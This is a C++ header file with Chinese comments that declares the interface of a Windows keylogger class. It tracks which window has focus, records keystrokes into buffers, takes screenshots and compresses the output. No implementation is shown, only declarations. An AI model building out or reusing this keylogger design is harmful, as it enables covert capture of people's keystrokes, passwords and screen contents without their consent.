// Key_Memory.h: interface for the Key_Memory class.
//
//////////////////////////////////////////////////////////////////////

#include "Pack_Picture1.h"	// Added by ClassView
#include "MyCompress.h"

#if !defined(AFX_KEY_MEMORY_H__658049B9_201F_4303_8296_A2F1FD8DBE0B__INCLUDED_)
#define AFX_KEY_MEMORY_H__658049B9_201F_4303_8296_A2F1FD8DBE0B__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

class Key_Memory  
{
public:
	Key_Memory();
	virtual ~Key_Memory();
	BOOL KeyLogger(string &buffer);//buffer保留参数   n记录窗口次数
private:
	MyCompress my_compress;
	char *WindowCaption;
	HWND Old_hwnd;
	Pack_Picture picture;
	BOOL IsWindowsFocusChange();//窗口是否已经改变
	BOOL IsThisWindow();//是不是需要记录的窗口
	BOOL NeedToPicture();
	int sum;//有效窗口的个数
	char total_keyboard[2048];//总记录
	char *LowerCase[95];//键盘符号
	char *UpperCase[95];//大写字母
	int SpecialKeys[95];//虚拟键码
	char KeyBuffer[600];//记录数组 
	HWND PreviousFocus;//窗口句柄
};

#endif // !defined(AFX_KEY_MEMORY_H__658049B9_201F_4303_8296_A2F1FD8DBE0B__INCLUDED_)
